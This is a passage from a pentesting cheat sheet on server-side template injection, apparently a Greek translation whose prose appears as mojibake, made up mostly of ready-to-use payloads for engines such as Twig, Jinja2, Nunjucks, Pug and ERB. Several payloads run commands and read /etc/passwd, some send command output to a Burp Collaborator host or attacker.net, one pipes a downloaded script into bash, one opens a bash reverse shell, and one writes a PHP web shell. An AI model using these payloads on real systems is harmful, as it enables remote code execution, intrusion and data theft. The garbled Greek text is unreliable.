{% endcontent-ref %}

### Groovy (Java)

ÎŸÎ¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎµÎ¹Ï‚ Ï„Î¿Ï… Î¥Ï€ÎµÏÎ¸Ï…Î½Î¿Ï… Î‘ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï€ÏÎ¿Î­ÏÏ‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ [**Î±Î½Î¬Î»Ï…ÏƒÎ·**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ ÏƒÏ…Î½Î­Î´ÏÎ¹Î¿ ÎºÏ…Î²ÎµÏÎ½Î¿Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÏƒÏ„Î·Î½ **Î™ÏƒÏ€Î±Î½Î¯Î±** ÎºÎ±Î¹ Î­Î½Î± Î±Ï€ÏŒ Ï„Î± Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¬ ÏƒÏ„Î·Î½ **Î•Ï…ÏÏÏ€Î·**. ÎœÎµ **Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Ï„Î·Î½ Ï€ÏÎ¿ÏÎ¸Î·ÏƒÎ· Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ Î³Î½ÏÏƒÎ·Ï‚**, Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏ…Î½Î­Î´ÏÎ¹Î¿ Î±Ï€Î¿Ï„ÎµÎ»ÎµÎ¯ Î­Î½Î±Î½ Î¶Ï‰Î½Ï„Î±Î½ÏŒ Ï‡ÏÏÎ¿ ÏƒÏ…Î½Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Î³Î¹Î± ÎµÏ€Î±Î³Î³ÎµÎ»Î¼Î±Ï„Î¯ÎµÏ‚ Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯Î±Ï‚ ÎºÎ±Î¹ ÎºÏ…Î²ÎµÏÎ½Î¿Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÏƒÎµ ÎºÎ¬Î¸Îµ Ï€ÎµÎ´Î¯Î¿.

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* Î£Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± Smarty Ï„Î¿Ï… [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Error`
* `{{foobar}} Nothing`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - ÎœÎ¿ÏÏ†Î® Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï…**
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* Î£Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± Twig ÎºÎ±Î¹ Twig (Sandboxed) Ï„Î¿Ï… [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Î¤Î¿ Plates ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÏƒÏÏƒÏ„Î·Î¼Î± Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î¿ ÏƒÏ„Î· Î³Î»ÏÏƒÏƒÎ± PHP, ÎµÎ¼Ï€Î½ÎµÏ…ÏƒÎ¼Î­Î½Î¿ Î±Ï€ÏŒ Ï„Î¿ Twig. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Î½Ï„Î¯Î¸ÎµÏ„Î± Î¼Îµ Ï„Î¿ Twig, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î¼Î¹Î± Î½Î­Î± ÏƒÏÎ½Ï„Î±Î¾Î·, Ï„Î¿ Plates Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± PHP ÏƒÏ„Î± Ï€ÏÏŒÏ„Ï…Ï€Î±, ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ÎµÏ…Î±Î½Î¬Î³Î½Ï‰ÏƒÏ„Î¿ Î³Î¹Î± Ï„Î¿Ï…Ï‚ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ PHP.

Î•Î»ÎµÎ³ÎºÏ„Î®Ï‚:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
Î ÏÏŒÏ„Ï…Ï€Î¿ ÏƒÎµÎ»Î¯Î´Î±Ï‚:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
Î”Î¹Î¬Ï„Î±Î¾Î· Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï…:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlib ÎºÎ±Î¹ HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Î¯Î´Î¹Î¿ Î¼Îµ Ï„Î¿ PHPlib Î±Î»Î»Î¬ Î¼ÎµÏ„Î±Ï†Î­ÏÎ¸Î·ÎºÎµ ÏƒÏ„Î¿ Pear.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
## Server-Side Template Injection (SSTI)

### Description

Server-Side Template Injection (SSTI) occurs when an application allows user input to be evaluated as a template on the server. This can lead to arbitrary code execution and a full compromise of the server.

### Exploitation

To exploit SSTI, an attacker can inject template code into user input fields that are later evaluated by the server. This can be achieved by identifying where user input is being used in templates and injecting template code accordingly.

### Prevention

To prevent SSTI, it is important to validate and sanitize all user input before using it in templates. Additionally, using a safe templating engine that automatically escapes user input can help mitigate the risk of SSTI vulnerabilities.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html\_template\_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html\_template\_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* Î£Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± Jade Ï„Î¿Ï… [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) Î¼Î· ÏƒÏ…Î½Ï„Î±ÎºÏ„Î¹ÎºÏŒÏ‚ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒÏ‚ Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ PHP, Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ XML Î³Î¹Î± Î½Î± Î´Î¹Î±Î¹ÏÎ­ÏƒÎµÎ¹ Î­Î½Î± Î­Î³Î³ÏÎ±Ï†Î¿ ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ Î¼Î­ÏÎ·
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

Î”Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Î”Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ (Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ [ÎµÎ´Ï](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Î£Ï†Î¬Î»Î¼Î±
* ${7\*7} = ${7\*7}
* Î¤Î¯Ï€Î¿Ï„Î±
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Î ÏÏŒÏ„Ï…Ï€Î¿** | **Î ÎµÏÎ¹Î³ÏÎ±Ï†Î®**                         |
| ------------ | --------------------------------------- |
|              | Î‘Î¾Î¹Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎºÎ±Î¹ Î±Ï€ÎµÎ¹ÎºÏŒÎ½Î¹ÏƒÎ· ÎµÎ¾ÏŒÎ´Î¿Ï…              |
|              | Î‘Î¾Î¹Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎºÎ±Î¹ Î±Ï€ÎµÎ¹ÎºÏŒÎ½Î¹ÏƒÎ· ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·Ï‚ ÏƒÎµ HTML ÎµÎ¾ÏŒÎ´Î¿Ï… |
|              | Î£Ï‡ÏŒÎ»Î¹Î¿                                 |
| ÎºÎ±Î¹          | Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÎºÏÎ´Î¹ÎºÎ± (Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®)        |

* \= 49

**Î Î»ÎµÏ…ÏÎ¬ Î ÎµÎ»Î¬Ï„Î·**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Î Î»ÎµÏ…ÏÎ¬ Î”Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒÎ´Î¿ÏƒÎ·Ï‚ ÏƒÏ„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Î§Ï‰ÏÎ¯Ï‚ Î­Î¾Î¿Î´Î¿
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Î£Ï†Î¬Î»Î¼Î±
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Î£Ï†Î¬Î»Î¼Î±`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Î¡Î¯Î¾Ï„Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÏ„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ»Î¯Î´Î± Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ ÎºÏŒÎ»Ï€Î± ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ **Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î¹Ï‚ Î±Î¼Î¼Î¿Î¸Ï…ÏÎ¯Î´ÎµÏ‚** ÏƒÏ„Î·Î½ Python:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[Î•Ï€Î¯ÏƒÎ·Î¼Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±](http://jinja.pocoo.org)

> Î¤Î¿ Jinja2 ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€Î»Î®ÏÏ‰Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒ ÏƒÏÏƒÏ„Î·Î¼Î± Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ Î³Î¹Î± Ï„Î· Î³Î»ÏÏƒÏƒÎ± Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï Python. Î”Î¹Î±Î¸Î­Ï„ÎµÎ¹ Ï€Î»Î®ÏÎ· Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· Unicode, Ï€ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÏŒ Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¼Î­Î½Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ Î¼Îµ Î±Î¼Î¼ÏŒÎ»Î¿Ï†Î¿, ÎµÏ…ÏÎµÎ¯Î± Ï‡ÏÎ®ÏƒÎ· ÎºÎ±Î¹ Î¬Î´ÎµÎ¹Î± BSD.

* `{{7*7}} = Î£Ï†Î¬Î»Î¼Î±`
* `${7*7} = ${7*7}`
* `{{foobar}} Î¤Î¯Ï€Î¿Ï„Î±`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}




{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - ÎœÎ¿ÏÏ†Î® Î ÏÎ¿Ï„ÏÏ€Î¿Ï…**
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE Î´ÎµÎ½ ÎµÎ¾Î±ÏÏ„Î¬Ï„Î±Î¹ Î±Ï€ÏŒ**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ Ï€ÏÏ‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¿ Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

Î†Î»Î»Î± payloads ÏƒÏ„Î¿ [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= Î•Ï€Î¹Ï„Ï…Ï‡Î¯Î±`
